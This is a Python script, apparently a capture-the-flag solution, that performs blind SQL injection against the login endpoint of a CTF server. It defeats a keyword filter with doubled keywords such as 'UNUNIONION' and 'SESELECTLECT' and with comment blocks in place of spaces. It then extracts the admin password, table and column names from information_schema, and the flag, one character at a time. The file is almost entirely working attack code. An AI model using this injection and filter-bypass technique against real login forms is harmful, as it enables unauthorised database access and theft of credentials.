import requests
import string

url = 'http://h4ck3r.quest:10006/login'

alnum = string.printable

# Execution function given specific format sql command
def exec(gen_func, payload = ''):
  cnt = 0
  while cnt < 80:
    cur = len(payload)
    for i in alnum:
      payl = payload + f"\{i}%"
      print(payl)
      myobj = {'username': '\\', 'password': gen_func(payl)}
      x = requests.post(url, data = myobj)
      # print(x.text)

      res = x.text
      if res[0] == 'W':
        payload += f"\{i}"
        break
    if cur == len(payload):
      print("Failed :(")
      return payload
    cnt += 1
    
def get_admin_password():
  def gen_func(payl):
    return f'||/**/passwoorrd/**/like/**/{"0x"+payl.encode().hex()};#'
  return exec(gen_func, "FLAG")


def get_table_name():
  def gen_func(payl):
    return f'/**/UNUNIONION/**/SESELECTLECT/**/1,2,table_name/**/from/**/\
      infoorrmation_schema.tables/**/whwhereere/**/table_schema/**/like/**/\
      {"0x"+"db".encode().hex()}/**/anandd/**/table_name/**/like/**/{"0x"+payl.encode().hex()}/**/limit/**/0,1;#'
  return exec(gen_func, "\\h\\3\\y\\_\\h\\e\\r\\e\\_\\1\\5\\_\\t\\h\\e\\_\\f\\l\\a\\g\\_\\y")


def get_column_name(table_name):
  def gen_func(payl):
    return f'/**/UNUNIONION/**/SESELECTLECT/**/1,2,column_name/**/from/**/\
      infoorrmation_schema.columns/**/whwhereere/**/table_schema/**/like/**/\
      {"0x"+"db".encode().hex()}/**/anandd/**/table_name/**/like/**/{"0x"+table_name.encode().hex()}\
      /**/anandd/**/column_name/**/like/**/BINARY/**/{"0x"+payl.encode().hex()}/**/limit/**/0,1;#'
  return exec(gen_func)


def get_flag(table_name, column_name):
  def gen_func(payl):
    return f'/**/UNUNIONION/**/SESELECTLECT/**/1,2,3/**/from/**/\
      `{table_name}`/**/whwhereere/**/{column_name}/**/like/**/\
        BINARY/**/{"0x"+payl.encode().hex()};#'
  return exec(gen_func)


def filter(s):
  return s.replace('\\', '')


def main():
  # password = get_admin_password()
  # print(password) 
  # > FLAG(is_in_another_table)

  table_name = get_table_name()
  table_name = filter(table_name)
  print("Tablename: ", table_name)

  column_name = get_column_name(table_name)
  column_name = filter(column_name)
  print("Columnname: ", column_name)

  flag = get_flag(table_name, column_name)
  flag = filter(flag)
  print(f"Flag: {flag}")
  
main()